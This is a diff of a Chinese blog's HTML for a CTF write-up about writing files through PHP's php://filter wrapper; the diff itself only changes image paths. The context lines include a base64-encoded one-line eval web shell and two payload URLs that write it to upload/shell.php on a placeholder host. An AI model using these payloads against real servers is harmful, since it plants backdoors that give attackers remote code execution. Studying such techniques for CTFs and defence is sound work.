@@ -22,21 +22,20 @@
 <p>“phpdienophp”一共11个字符，因为base64算法解码时是4个byte一组，所以给他增加1个”a”，一共12个字符。这样，”phpdienophp”被正常解码，而后面我们传入的webshell的base64内容也被正常解码。</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span> =&gt; PD9waHAgcGhwaW5mbygpOz8+ =&gt; aPD9waHAgcGhwaW5mbygpOz8+ =&gt; YVBEOXdhSEFnY0dod2FXNW1ieWdwT3o4Kw==</span><br></pre></td></tr></table></figure>
 
-<p><img src="../img/%E8%AE%B0%E5%8F%88%E5%8F%88%E5%8F%88%E4%B8%80%E6%AC%A1%E6%8B%89%E7%BB%83/image-20211011132326071.png" alt="image-20211011132326071"></p>
-<p><img src="../img/%E8%AE%B0%E5%8F%88%E5%8F%88%E5%8F%88%E4%B8%80%E6%AC%A1%E6%8B%89%E7%BB%83/image-20211011142654572.png" alt="image-20211011142654572"></p>
-<p><img src="../img/%E8%AE%B0%E5%8F%88%E5%8F%88%E5%8F%88%E4%B8%80%E6%AC%A1%E6%8B%89%E7%BB%83/image-20211011142751873.png" alt="image-20211011142751873"></p>
+<p><img src="/img/%E8%AE%B0%E5%8F%88%E5%8F%88%E5%8F%88%E4%B8%80%E6%AC%A1%E6%8B%89%E7%BB%83/image-20211011132326071.png" alt="image-20211011132326071"></p>
+<p><img src="/img/%E8%AE%B0%E5%8F%88%E5%8F%88%E5%8F%88%E4%B8%80%E6%AC%A1%E6%8B%89%E7%BB%83/image-20211011142654572.png" alt="image-20211011142654572"></p>
+<p><img src="/img/%E8%AE%B0%E5%8F%88%E5%8F%88%E5%8F%88%E4%B8%80%E6%AC%A1%E6%8B%89%E7%BB%83/image-20211011142751873.png" alt="image-20211011142751873"></p>
 <p>写入一句话<code>&lt;?php eval($_POST[1]);?&gt;</code>文件</p>
 <figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">http://ctf.xxx.<span class="keyword">com</span>?path=php://<span class="built_in">filter</span>/<span class="keyword">write</span>=convert.base64-decode/resource=upload/<span class="keyword">shell</span>.php&amp;data=YVBEOXdhSEFnWlhaaGJDZ2tYMUJQVTFSYk1WMHBPejgr</span><br></pre></td></tr></table></figure>
 
-<p><img src="../img/%E8%AE%B0%E5%8F%88%E5%8F%88%E5%8F%88%E4%B8%80%E6%AC%A1%E6%8B%89%E7%BB%83/image-20211011132825365.png" alt="image-20211011132825365"></p>
+<p><img src="/img/%E8%AE%B0%E5%8F%88%E5%8F%88%E5%8F%88%E4%B8%80%E6%AC%A1%E6%8B%89%E7%BB%83/image-20211011132825365.png" alt="image-20211011132825365"></p>
 <p>蚁剑连接,翻看flag。</p>
-<p><img src="../img/%E8%AE%B0%E5%8F%88%E5%8F%88%E5%8F%88%E4%B8%80%E6%AC%A1%E6%8B%89%E7%BB%83/image-20211011143035632.png" alt="image-20211011143035632"></p>
+<p><img src="/img/%E8%AE%B0%E5%8F%88%E5%8F%88%E5%8F%88%E4%B8%80%E6%AC%A1%E6%8B%89%E7%BB%83/image-20211011143035632.png" alt="image-20211011143035632"></p>
 <h5 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h5><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>ctf.xxx.com<span class="regexp">/?path=php:/</span><span class="regexp">/filter/</span>write=string.strip_tags|convert.base64-decode<span class="regexp">/resource=upload/</span>test1245.php&amp;data=UEQ5d2FIQWdjR2h3YVc1bWJ5Z3BPeUEvUGc9PQ==</span><br></pre></td></tr></table></figure>
 
-<p><img src="../img/%E8%AE%B0%E5%8F%88%E5%8F%88%E5%8F%88%E4%B8%80%E6%AC%A1%E6%8B%89%E7%BB%83/image-20211011142123931.png" alt="image-20211011142123931"></p>
-<p><img src="../img/%E8%AE%B0%E5%8F%88%E5%8F%88%E5%8F%88%E4%B8%80%E6%AC%A1%E6%8B%89%E7%BB%83/image-20211011141958762.png" alt="image-20211011141958762"></p>
-<p><img src="../img/%E8%AE%B0%E5%8F%88%E5%8F%88%E5%8F%88%E4%B8%80%E6%AC%A1%E6%8B%89%E7%BB%83/image-20211011170414108.png" alt="image-20211011170414108"></p>
-<h4 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h4><p>仅供参考~</p>
+<p><img src="/img/%E8%AE%B0%E5%8F%88%E5%8F%88%E5%8F%88%E4%B8%80%E6%AC%A1%E6%8B%89%E7%BB%83/image-20211011142123931.png" alt="image-20211011142123931"></p>
+<p><img src="/img/%E8%AE%B0%E5%8F%88%E5%8F%88%E5%8F%88%E4%B8%80%E6%AC%A1%E6%8B%89%E7%BB%83/image-20211011141958762.png" alt="image-20211011141958762"></p>
+<p><img src="/img/%E8%AE%B0%E5%8F%88%E5%8F%88%E5%8F%88%E4%B8%80%E6%AC%A1%E6%8B%89%E7%BB%83/image-20211011170414108.png" alt="image-20211011170414108"></p>
 <h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p>
 <p><a href="https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/" target="_blank" rel="noopener">https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/</a></p>
 ]]></content>
